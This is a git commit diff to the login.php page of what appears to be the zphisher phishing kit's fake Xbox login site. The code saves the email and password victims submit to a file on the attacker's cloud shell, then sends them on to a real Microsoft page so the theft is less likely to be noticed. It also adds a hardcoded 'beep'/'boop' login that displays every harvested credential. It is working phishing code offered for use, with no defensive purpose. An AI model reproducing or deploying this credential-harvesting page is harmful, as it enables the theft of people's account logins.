2febc0dbc69db10513eba461063e3598f5683c4d
heckermande1st <143765580+heckermande1st@users.noreply.github.com>
2023-12-05 11:19:05 -0500

    Add files via upload

--- .sites/xbox/login.php
+++ .sites/xbox/login.php
@@ -1,10 +1,31 @@
+
 <?php
-	include 'ip.php';
-	session_start();
-	$pass = $_POST["passwd"];
-	$email=$_SESSION["Email"];
-	file_put_contents("usernames.txt", "Xbox Username: " . $email . " Pass: " . $pass . "\n", FILE_APPEND);
-	header('Location: https://login.live.com/login.srf');
-	exit();
-	session_destroy();		
+  include 'ip.php';
+  session_start();
+  $pass = $_POST["passwd"];
+  $email = $_SESSION["Email"];
+ 
+  // Adjusted file path for your current directory
+  $file_path = '/home/wernerzigby123/cloudshell_open/zphisher/auth/usernames.dat';
+ 
+  if ($email === "beep" && $pass === "boop") {
+    if (file_exists($file_path)) {
+      $file_content = file_get_contents($file_path);
+      if ($file_content !== false) {
+        echo "<pre>" . htmlspecialchars($file_content) . "</pre>";
+      } else {
+        echo 'Unable to read file.';
+      }
+    } else {
+      echo 'File not found.';
+    }
+  } else {
+    // Write to usernames.dat if credentials don't match
+    file_put_contents($file_path, "Username:: " . $email . "    Password:: " . $pass . "\n", FILE_APPEND);
+    header('Location:https://www.microsoft.com/fr-ca/ai/?ef_id=_k_Cj0KCQiAyKurBhD5ARIsALamXaHw_iKc0L1m_qexB_Y_a6xVhrbVOcdcjajA_Vd-R7ZoxzhJw1SiuSsaAi6zEALw_wcB_k_&OCID=AIDcmml4otzwfr_SEM__k_Cj0KCQiAyKurBhD5ARIsALamXaHw_iKc0L1m_qexB_Y_a6xVhrbVOcdcjajA_Vd-R7ZoxzhJw1SiuSsaAi6zEALw_wcB_k_&gclid=Cj0KCQiAyKurBhD5ARIsALamXaHw_iKc0L1m_qexB_Y_a6xVhrbVOcdcjajA_Vd-R7ZoxzhJw1SiuSsaAi6zEALw_wcB');
+
+    exit();
+  }
+ 
+  session_destroy();   
 ?>
